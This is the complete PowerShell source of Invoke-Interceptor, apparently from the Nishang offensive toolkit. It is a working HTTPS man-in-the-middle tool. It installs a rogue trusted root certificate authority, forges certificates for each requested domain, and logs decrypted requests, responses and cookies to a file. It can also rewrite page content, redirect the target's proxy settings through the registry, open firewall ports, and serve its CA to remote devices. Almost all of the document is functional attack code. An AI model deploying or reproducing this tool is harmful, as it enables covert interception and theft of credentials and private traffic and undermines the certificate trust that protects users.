function Invoke-Interceptor
{
<#
.SYNOPSIS
Nishang script which is capable of intercepting HTTPS requests by setting up a proxy server and log them to a file.

.DESCRIPTION

This experimental script, written by Casey Smith (@subTee), demonstrates the ability to capture and tamper with Web sessions.  
For secure sessions, this is done by dynamically writing certificates to match the requested domain. Interceptor IP and Port 
(default 8081) must be set as proxy on a target browser. 

The script can be used from reverse shells, PowerShell Remoting etc. Keep in mind the user context with which the script is
executed. For example, executing this with SYSTEM privileges will not intercept traffic of a normal user. 

The script logs all the requests and responses to temporary directory of the current user. 
 
This script requires local administrative privileges to execute properly and installs certificates in Trusted Root Store.

Traffic of Remote machines (where Interceptor is not runninng) if Interceptor is used as proxy. The certificate needs to be
installed on the remote machine by browsing to http://[InterceptorIP]:8082/i.cer.

Function: Interceptor
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 1.3.28

.PARAMETER ListenPort
Configurable Port to listen for incoming Web requests.  The Default is 8081.

.PARAMETER ProxyServer
In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server.  
Default behavior expects no upstream proxy.

.PARAMETER ProxyPort
In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server.  
This sets the Port for the upstream proxy

.PARAMETER Tamper
Sometimes replaces "Cyber" with "Kitten"

.PARAMETER HostCA
This allows remote devices to connect and install the Interceptor Root Certificate Authority
From the remote/mobile device browse to http://[InterceptorIP]:8082/i.cer

.PARAMETER AutoProxyConfig
This will alter the proxy settings to drive traffic through Interceptor.

.PARAMETER Cleanup
Removes any installed certificates and exits.

.PARAMETER SearchString
If Tamper is enabled, this will search for a string to be replace. To be used with 'ReplaceString' parameter

.PARAMETER ReplaceString
If Tamper is enabled, this will be the string that replaces the string identified by the 'SearchString' parameter

.PARAMETER Domains
Accepts a list of domains to create Trusted root Certs for at the beginning of script run.List should be delimited with a comma ',' .

.PARAMETER Logfile
Log file where the script logs web requests and responses. The default is interceptor.log in the current user's temp directory.


.EXAMPLE
PS > Invoke-Interceptor -ProxyServer 192.168.230.21 -ProxyPort 3128
Above command starts interceptor on default port 8081 and passes requests to the Upstream Proxy server. 

.Example
PS > Invoke-Interceptor -AutoProxyConfig
Above command  starts interceptor and modifies the proxy settings of the target to drive traffic thorugh Interceptor. 
The effect takes place when the browser is restarted.

.EXAMPLE
PS > Invoke-Interceptor -Tamper 
Above command  starts interceptor and replaces "Cyber" with "Kittens" in web responses. 

.EXAMPLE
PS > Invoke-Interceptor -HostCA
Above command starts interceptor and serves certificate on http://[InterceptorIP]:8082/i.cer. A remote device, on which 
interceptor is not running, must be forced to install this certificate and use Interceptor as proxy. 
Only after that traffic of the remote device can be intercepted. 

.LINK
https://github.com/subTee/Interceptor
https://github.com/samratashok/nishang

#>
[CmdletBinding()]
Param(
  [Parameter(Mandatory=$False,Position=0)]
  [int]$ListenPort,
  
  [Parameter(Mandatory=$False,Position=1)]
  [string]$ProxyServer,
  
  [Parameter(Mandatory=$False,Position=2)]
  [int]$ProxyPort,
  
  [Parameter(Mandatory=$False,Position=3)]
  [switch]$Tamper,
  
  [Parameter(Mandatory=$False,Position=4)]
  [switch]$HostCA,
  
  [Parameter(Mandatory=$False,Position=5)]
  [switch]$AutoProxyConfig,
  
  [Parameter(Mandatory=$False,Position=6)]
  [switch]$Cleanup,

  [Parameter(Mandatory=$False,Position=7)] 
  [string]$SearchString,

  [Parameter(Mandatory=$False,Position=8)] 
  [string]$ReplaceString,

  [Parameter(Mandatory=$False, Position=9)]
  [string]$Domains,
  
  [Parameter(Mandatory=$False, Position=10)]
  [string]$LogFile = "$env:temp\interceptor.log"
)

function Set-AutomaticallyDetectProxySettings ($enable) 
{ 
    # Read connection settings from Internet Explorer. 
    $regKeyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\" 
    $conSet = $(Get-ItemProperty $regKeyPath).DefaultConnectionSettings 
  
    # Index into DefaultConnectionSettings where the relevant flag resides. 
    $flagIndex = 8 
  
    # Bit inside the relevant flag which indicates whether or not to enable automatically detect proxy settings. 
    $autoProxyFlag = 8 
  
    if ($enable) 
    { 
         if ($($conSet[$flagIndex] -band $autoProxyFlag) -eq $autoProxyFlag) 
        { 
        } 
        else 
        { 
            Write-Output "Enabling 'Automatically detect proxy settings'." 
             $conSet[$flagIndex] = $conSet[$flagIndex] -bor $autoProxyFlag 
            $conSet[4]++ 
            Set-ItemProperty -Path $regKeyPath -Name DefaultConnectionSettings -Value $conSet 
         } 
    } 
    else 
    { 
        if ($($conSet[$flagIndex] -band $autoProxyFlag) -eq $autoProxyFlag) 
        { 
            # 'Automatically detect proxy settings' was enabled, adding one disables it. 
            Write-Output "Disabling 'Automatically detect proxy settings'." 
            $mask = -bnot $autoProxyFlag 
             $conSet[$flagIndex] = $conSet[$flagIndex] -band $mask 
            $conSet[4]++ 
            Set-ItemProperty -Path $regKeyPath -Name DefaultConnectionSettings -Value $conSet 
        } 
    }

     $conSet = $(Get-ItemProperty $regKeyPath).DefaultConnectionSettings 
        if ($($conSet[$flagIndex] -band $autoProxyFlag) -ne $autoProxyFlag) 
        { 
            Write-Output "'Automatically detect proxy settings' is disabled." 
        } 
         else 
        { 
            Write-Output "'Automatically detect proxy settings' is enabled." 
        } 
}
function Start-CertificateAuthority()
{
	#Thanks to @obscuresec for this Web Host
	#Pulls CA Certificate from Store and Writes Directly back to Mobile Device
	# example: http://localhost:8082/i.cer
	Start-Job -ScriptBlock {
			
			$Hso = New-Object Net.HttpListener
			$Hso.Prefixes.Add("http://+:8082/")
			$Hso.Start()
			While ($Hso.IsListening) {
				$HC = $Hso.GetContext()
				$HRes = $HC.Response
				$HRes.Headers.Add("Content-Type","application/pkix-cert")
				$cert = Get-ChildItem cert:\LocalMachine\Root | where { $_.Issuer -match "__Interceptor_Trusted_Root" }
				$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::cert
				$Buf = $cert.Export($type)
				$HRes.OutputStream.Write($Buf,0,$Buf)
				$HRes.Close()
			}
				
			}
	
	
	
}

function Invoke-RemoveCertificates([string] $issuedBy)
{
	$certs = Get-ChildItem cert:\LocalMachine\My | where { $_.Issuer -match $issuedBy }
	if($certs)
	{
		foreach ($cert in $certs) 
		{
			$store = Get-Item $cert.PSParentPath
			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
			$store.Remove($cert)
			$store.Close()
		}
	}
	#Remove Any Trusted Root Certificates
	$certs = Get-ChildItem cert:\LocalMachine\Root | where { $_.Issuer -match $issuedBy }
	if($certs)
	{
	foreach ($cert in $certs) 
		{
			$store = Get-Item $cert.PSParentPath
			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
			$store.Remove($cert)
			$store.Close()
		}
	}

	#Remove Any Intermediate CA Certificates                                               #spaceB0x!
	$certs = Get-ChildItem cert:\LocalMachine\CA | where { $_.Issuer -match $issuedBy }
	if($certs)
	{
	foreach ($cert in $certs) 
		{
			$store = Get-Item $cert.PSParentPath
			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
			$store.Remove($cert)
			$store.Close()
		}
	}

	[Console]::WriteLine("Certificates Removed")
		
}

# Customize key length
# Could add [System.Runtime.Interopservices.Marshal]::ReleaseComObject($x) at end to get rid of "-com processes" http://technet.microsoft.com/en-us/library/ff730962.aspx
# Could maybe customize Cert Names

function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
{
	$CAsubject = $certSubject
	$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
	$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	#Issuer Property for cleanup
    $issuer = "__Interceptor_Trusted_Root"
	$issuerdn = new-object -com "X509Enrollment.CX500DistinguishedName"
	$issuerdn.Encode("CN=" + $issuer, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	# Create a new Private Key
	$key = new-object -com "X509Enrollment.CX509PrivateKey"
	$key.ProviderName =  "Microsoft Enhanced RSA and AES Cryptographic Provider" #"Microsoft Enhanced Cryptographic Provider v1.0"	
	# Set CAcert to 1 to be used for Signature
	if($isCA)
		{
			$key.KeySpec = 2 
		}
	else
		{
			$key.KeySpec = 1
		}
	$key.Length = 2048
	$key.MachineContext = 1
	$key.Create() 
	 
	# Create Attributes
	$serverauthoid = new-object -com "X509Enrollment.CObjectId"
	$serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
	$ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
	$ekuoids.add($serverauthoid)
	$ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
	$ekuext.InitializeEncode($ekuoids)

	$cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
	$cert.InitializeFromPrivateKey(2, $key, "")
	$cert.Subject = $dn
	$cert.Issuer = $issuerdn
	$cert.NotBefore = (get-date).AddDays(-1) #Backup One day to Avoid Timing Issues
	$cert.NotAfter = $cert.NotBefore.AddDays(90) #Arbitrary... Change to persist longer...
	#Use Sha256
	$hashAlgorithmObject = New-Object -ComObject X509Enrollment.CObjectId
	$hashAlgorithmObject.InitializeFromAlgorithmName(1,0,0,"SHA256")
	$cert.HashAlgorithm = $hashAlgorithmObject
	#Good Reference Here http://www.css-security.com/blog/creating-a-self-signed-ssl-certificate-using-powershell/
	
	$cert.X509Extensions.Add($ekuext)
	if ($isCA)
	{
		$basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
		$basicConst.InitializeEncode("true", 1)
		$cert.X509Extensions.Add($basicConst)
	}
	else
	{              
		$signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root" })
		$signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
		$signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
		$cert.SignerCertificate = $signerCertificate
	}
	$cert.Encode()

	$enrollment = new-object -com "X509Enrollment.CX509Enrollment"
	$enrollment.InitializeFromRequest($cert)
	$certdata = $enrollment.CreateRequest(0)
	$enrollment.InstallResponse(2, $certdata, 0, "")

	if($isCA)
	{              
									
		# Need a Better way to do this...
		$CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root" })
		# Install CA Root Certificate
		$StoreScope = "LocalMachine"
		$StoreName = "Root"
		$store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
		$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
		$store.Add($CACertificate)
		$store.Close()
									
	}
	else
	{
		return (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $CAsubject })
	} 
     
}

function Receive-ServerHttpResponse ([System.Net.WebResponse] $response)
{
	#Returns a Byte[] from HTTPWebRequest, also for HttpWebRequest Exception Handling
	Try
	{
		[string]$rawProtocolVersion = "HTTP/" + $response.ProtocolVersion
		[int]$rawStatusCode = [int]$response.StatusCode
		[string]$rawStatusDescription = [string]$response.StatusDescription
		$rawHeadersString = New-Object System.Text.StringBuilder 
		$rawHeaderCollection = $response.Headers
		$rawHeaders = $response.Headers.AllKeys
		[bool] $transferEncoding = $false 
		# This is used for Chunked Processing.
		
		foreach($s in $rawHeaders)
		{
			 #We'll handle setting cookies later
			if($s -eq "Set-Cookie") { Continue }
			if($s -eq "Transfer-Encoding") 
			{
				$transferEncoding = $true
				continue
			}
			[void]$rawHeadersString.AppendLine($s + ": " + $rawHeaderCollection.Get($s) ) #Use [void] or you will get extra string stuff.
		}	
		$setCookieString = $rawHeaderCollection.Get("Set-Cookie") -Split '($|,(?! ))' #Split on "," but not ", "
		if($setCookieString)
		{
			foreach ($respCookie in $setCookieString)
			{
				if($respCookie -eq "," -Or $respCookie -eq "") {continue}
				[void]$rawHeadersString.AppendLine("Set-Cookie: " + $respCookie) 
			}
		}
		
		$responseStream = $response.GetResponseStream()
		
		$rstring = $rawProtocolVersion + " " + $rawStatusCode + " " + $rawStatusDescription + "`r`n" + $rawHeadersString.ToString() + "`r`n"
		
		[byte[]] $rawHeaderBytes = [System.Text.Encoding]::Ascii.GetBytes($rstring)
		
		Write-Host $rstring 

        #Write to log file
		Out-File -FilePath $LogFile -InputObject $rstring -Append
		[void][byte[]] $outdata 
		$tempMemStream = New-Object System.IO.MemoryStream
		[byte[]] $respbuffer = New-Object Byte[] 32768 # 32768
		
		if($transferEncoding)
		{
			$reader = New-Object System.IO.StreamReader($responseStream)
			[string] $responseFromServer = $reader.ReadToEnd()
			
			if ($Tamper)
			{
                if (($SearchString -ne $null) -and ($ReplaceString -ne $null))
                {
                    if($responseFromServer -match $SearchString)
                    {
                        $responseFromServer = $responseFromServer -replace $SearchString,$ReplaceString
                    }
                }

				else 
				{
					$responseFromServer = $responseFromServer -replace 'Cyber', 'Kitten'   # First junk to try
				}
			}
			
			$outdata = [System.Text.Encoding]::UTF8.GetBytes($responseFromServer)
			$reader.Close()
		}
		else
		{
			while($true)
			{
				[int] $read = $responseStream.Read($respbuffer, 0, $respbuffer.Length)
				if($read -le 0)
				{
					$outdata = $tempMemStream.ToArray()
					break
				}
				$tempMemStream.Write($respbuffer, 0, $read)
			}
		
			if ($Tamper -And $response.ContentType -match "text/html")
			{
				
				$outdataReplace = [System.Text.Encoding]::UTF8.GetString($outdata)
				if($outdataReplace -match 'Cyber')
				{
					$outdataReplace = $outdataReplace -Replace 'Cyber', 'Kitten' 
					$outdata = [System.Text.Encoding]::UTF8.GetBytes($outdataReplace)
				}
				
				
			}
		}
		[byte[]] $rv = New-Object Byte[] ($rawHeaderBytes.Length + $outdata.Length)
		#Combine Header Bytes and Entity Bytes 
		
		[System.Buffer]::BlockCopy( $rawHeaderBytes, 0, $rv, 0, $rawHeaderBytes.Length)
		[System.Buffer]::BlockCopy( $outdata, 0, $rv, $rawHeaderBytes.Length, $outdata.Length ) 
	
		
		$tempMemStream.Close()
		$response.Close()
		
		return $rv
	}
	Catch [System.Exception]
	{
		[Console]::WriteLine("Get Response Error")
		[Console]::WriteLine($_.Exception.Message)
    }#End Catch
	
}

function Send-ServerHttpRequest([string] $URI, [string] $httpMethod,[byte[]] $requestBytes, [System.Net.WebProxy] $proxy )
{	
	#Prepare and Send an HttpWebRequest From Byte[] Returns Byte[]
	Try
	{
		$requestParse = [System.Text.Encoding]::UTF8.GetString($requestBytes)
		[string[]] $requestString = ($requestParse -split '[\r\n]') |? {$_} 
		
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
		[System.Net.HttpWebRequest] $request = [System.Net.HttpWebRequest] [System.Net.WebRequest]::Create($URI)	
		
		$request.KeepAlive = $false
		$request.ProtocolVersion = [System.Net.Httpversion]::version11 
		$request.ServicePoint.ConnectionLimit = 1
		if($proxy -eq $null) { $request.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() }
		else { $request.Proxy = $proxy }
		$request.Method = $httpMethod
		$request.AllowAutoRedirect = $false 
		$request.AutomaticDecompression = [System.Net.DecompressionMethods]::None
	
		For ($i = 1; $i -le $requestString.Length; $i++)
		{
			$line = $requestString[$i] -split ": " 
			if ( $line[0] -eq "Host" -Or $line[0] -eq $null ) { continue }
			Try
			{
				#Add Header Properties Defined By Class
				switch($line[0])
				{
					"Accept" { $request.Accept = $line[1] }
					"Connection" { "" }
					"Content-Length" { $request.ContentLength = $line[1] }
					"Content-Type" { $request.ContentType = $line[1] }
					"Expect" { $request.Expect = $line[1] }
					"Date" { $request.Date = $line[1] }
					"If-Modified-Since" { $request.IfModifiedSince = $line[1] }
					"Range" { $request.Range = $line[1] }
					"Referer" { $request.Referer = $line[1] }
					"User-Agent" { $request.UserAgent = $line[1]  + " Intercepted Traffic"} 
					# Added Tampering Here...User-Agent Example
					"Transfer-Encoding"  { $request.TransferEncoding = $line[1] } 
					default {
								if($line[0] -eq "Accept-Encoding")
								{	
									$request.Headers.Add( $line[0], " ") #Take that Gzip...      GETS rid of gzip compression....makes tampering easeir
									#Otherwise have to decompress response to tamper with content...
								}
								else
								{
									$request.Headers.Add( $line[0], $line[1])
								}	
	
							}
				}
				
			}
			Catch
			{
				
			}
		}
			
		if (($httpMethod -eq "POST") -And ($request.ContentLength -gt 0)) ##Allows the ability to tread POST requests differently
		{
			[System.IO.Stream] $outputStream = [System.IO.Stream]$request.GetRequestStream()
			$outputStream.Write($requestBytes, $requestBytes.Length - $request.ContentLength, $request.ContentLength)
			$outputStream.Close()
		}
		
		
		return Receive-ServerHttpResponse $request.GetResponse()
		
	}
	Catch [System.Net.WebException]
	{
		#HTTPWebRequest  Throws exceptions based on Server Response.  So catch and return server response
		if ($_.Exception.Response) 
		{
			return Receive-ServerHttpResponse $_.Exception.Response
        }
			
    }#End Catch Web Exception
	Catch [System.Exception]
	{	
		Write-Verbose $_.Exception.Message
	}#End General Exception Occured...
	
}#Proxied Get

function Receive-ClientHttpRequest([System.Net.Sockets.TcpClient] $client, [System.Net.WebProxy] $proxy)
{
	
	Try
	{	
		$clientStream = $client.GetStream()
		$byteArray = new-object System.Byte[] 32768 
		[void][byte[]] $byteClientRequest

		do 
		 {
			[int] $NumBytesRead = $clientStream.Read($byteArray, 0, $byteArray.Length) 
			$byteClientRequest += $byteArray[0..($NumBytesRead - 1)]  
		 
		 } While ($clientStream.DataAvailable -And $NumBytesRead -gt 0) 
			
		#Now you have a byte[] Get a string...  Caution, not all that is sent is "string" Headers will be.
		$requestString = [System.Text.Encoding]::UTF8.GetString($byteClientRequest)
		
		[string[]] $requestArray = ($requestString -split '[\r\n]') |? {$_} 
		[string[]] $methodParse = $requestArray[0] -split " "
		#Begin SSL MITM IF Request Contains CONNECT METHOD
		
		if($methodParse[0] -ceq "CONNECT")
		{
			[string[]] $domainParse = $methodParse[1].Split(":")
			
			$connectSpoof = [System.Text.Encoding]::Ascii.GetBytes("HTTP/1.1 200 Connection Established`r`nTimeStamp: " + [System.DateTime]::Now.ToString() + "`r`n`r`n")
			$clientStream.Write($connectSpoof, 0, $connectSpoof.Length)	
			$clientStream.Flush()
			$sslStream = New-Object System.Net.Security.SslStream($clientStream , $false)
			$sslStream.ReadTimeout = 500
			$sslStream.WriteTimeout = 500
			$sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -eq "CN=" + $domainParse[0] })
			
			if ($sslcertfake -eq $null)
			{
				$sslcertfake =  Invoke-CreateCertificate $domainParse[0] $false
			}
			
			$sslStream.AuthenticateAsServer($sslcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls12, $false)
		
			$sslbyteArray = new-object System.Byte[] 32768
			[void][byte[]] $sslbyteClientRequest
			
			do 
			 {
				[int] $NumBytesRead = $sslStream.Read($sslbyteArray, 0, $sslbyteArray.Length) 
				$sslbyteClientRequest += $sslbyteArray[0..($NumBytesRead - 1)]  
			 } while ( $clientStream.DataAvailable  )
			
			$SSLRequest = [System.Text.Encoding]::UTF8.GetString($sslbyteClientRequest)
			Write-Host $SSLRequest -Fore Yellow
            Out-File -FilePath $LogFile -Append -InputObject $SSLRequest
			
			[string[]] $SSLrequestArray = ($SSLRequest -split '[\r\n]') |? {$_} 
			[string[]] $SSLmethodParse = $SSLrequestArray[0] -split " "
			
			$secureURI = "https://" + $domainParse[0] + $SSLmethodParse[1]
			
			[byte[]] $byteResponse =  Send-ServerHttpRequest $secureURI $SSLmethodParse[0] $sslbyteClientRequest $proxy
			
			if($byteResponse[0] -eq '0x00')
			{
				$sslStream.Write($byteResponse, 1, $byteResponse.Length - 1)
			}
			else
			{
				$sslStream.Write($byteResponse, 0, $byteResponse.Length )
			}
			
			
			
		}#End CONNECT/SSL Processing
		Else
		{
			Write-Host $requestString -Fore Cyan
            Out-File -FilePath $LogFile -Append -InputObject $requestString
			[byte[]] $proxiedResponse = Send-ServerHttpRequest $methodParse[1] $methodParse[0] $byteClientRequest $proxy
			if($proxiedResponse[0] -eq '0x00')
			{
				$clientStream.Write($proxiedResponse, 1, $proxiedResponse.Length - 1 )	
			}
			else
			{
				$clientStream.Write($proxiedResponse, 0, $proxiedResponse.Length )	
			}
			
		}#End Http Proxy
		
		
	}# End HTTPProcessing Block
	Catch
	{
		Write-Verbose $_.Exception.Message
		$client.Close()
	}
	Finally
	{
		$client.Close()
	}
                
}

function Main()
{	
	if($Cleanup)
	{
		Invoke-RemoveCertificates( "__Interceptor_Trusted_Root" )
		exit
	}
	
	# Create And Install Trusted Root CA.
	$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root"  })
	if ($CACertificate -eq $null)
	{
		Invoke-CreateCertificate "__Interceptor_Trusted_Root" $true
	}

	# Create Some Certificates Early to Speed up Capture. If you wanted to...
	# You could Add Auto Proxy Configuration here too.
    if($Domains -ne $null)                                                               
    {


         
         [string[]] $domainList = ($Domains -split '[,]') |? {$_} 
         foreach ($d in $domainList)
         {
             Write-Output $d
             $sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -eq "CN=" + $d })
             
             if($sslcertfake -eq $null){
                 $sslcertfake = Invoke-CreateCertificate $d $true
                 
             }
            # Taken from Invoke-CreateCertificate method
		    # Install CA Root Certificate
		    $StoreScope = "LocalMachine"
		    $StoreName = "Root"
		    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
		    $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
		    Write-Output "Adding certs"
            Write-Output $sslcertfake + "is"
            $store.Add($sslcertfake)
		    $store.Close()

         }

    }	


	if($HostCA)
	{
		netsh advfirewall firewall delete rule name="Interceptor Proxy 8082" | Out-Null #First Run May Throw Error...Thats Ok..:)
		netsh advfirewall firewall add rule name="Interceptor Proxy 8082" dir=in action=allow protocol=TCP localport=8082 | Out-Null
		Start-CertificateAuthority
		
	}
	
	if($ListenPort)
	{
		$port = $ListenPort
	}
	else
	{
		$port = 8081
	}
	
	$endpoint = New-Object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
	$listener = New-Object System.Net.Sockets.TcpListener $endpoint
	
	#This sets up a local firewall rule to suppress the Windows "Allow Listening Port Prompt"
	netsh advfirewall firewall delete rule name="Interceptor Proxy $port" | Out-Null #First Run May Throw Error...Thats Ok..:)
	netsh advfirewall firewall add rule name="Interceptor Proxy $port" dir=in action=allow protocol=TCP localport=$port | Out-Null
	
	if($AutoProxyConfig)
	{
		#TODO - Map Existing Proxy Settings, for transparent upstream chaining
		# 
		$proxyServerToDefine = "localhost:$port"

		$regKey="HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 
		
		Set-AutomaticallyDetectProxySettings ($false) 
			
		Set-ItemProperty -path $regKey ProxyEnable -value 1 
		Set-ItemProperty -path $regKey ProxyServer -value $proxyServerToDefine 
		Write-Output "Proxy is now enabled" 
		 
	}
	
	
	#There are issues in Windows 8.1 with Loopback Isolation, IE EPM, and RC4 Cipher.
	if ((Get-WmiObject Win32_OperatingSystem).Version -match "6.3")
	{
		CheckNetIsolation LoopbackExempt -a -n=windows_ie_ac_001
		#Registry key path
		$Keypath = "HKCU:\Software\Microsoft\Internet Explorer\Main"
		#Get registry key value named "Isolation"
		$value = Get-ItemProperty -Path $Keypath -Name "Isolation"  -ErrorAction SilentlyContinue
		Set-ItemProperty -Path $Keypath -Name "Isolation" -Value "PMIL"
		#Disable RC4 Cipher 
		md "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4 128" -ErrorAction SilentlyContinue
		md "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4 128/128" -ErrorAction SilentlyContinue
		new-itemproperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4 128/128" `
		-name "Enabled" -value 0 -PropertyType "Dword" -ErrorAction SilentlyContinue
		
	}
	
	if($ProxyServer)
	{
		$proxy = New-Object System.Net.WebProxy($ProxyServer, $ProxyPort)
		[Console]::WriteLine("Using Proxy Server $ProxyServer : $ProxyPort")
	}
	else
	{
		$proxy = $null
		# If you are going Direct.  You need this to be null, or HTTPWebrequest loops...
		[Console]::WriteLine("Using Direct Internet Connection")
	}
		
	
	$listener.Start()
	[Console]::WriteLine("Listening on $port")
	$client = New-Object System.Net.Sockets.TcpClient
	$client.NoDelay = $true
	
	
	
	while($true)
	{
		
		$client = $listener.AcceptTcpClient()
		if($client -ne $null)
		{
			Receive-ClientHttpRequest $client $proxy
		}
		
	}
	

}

Main
}

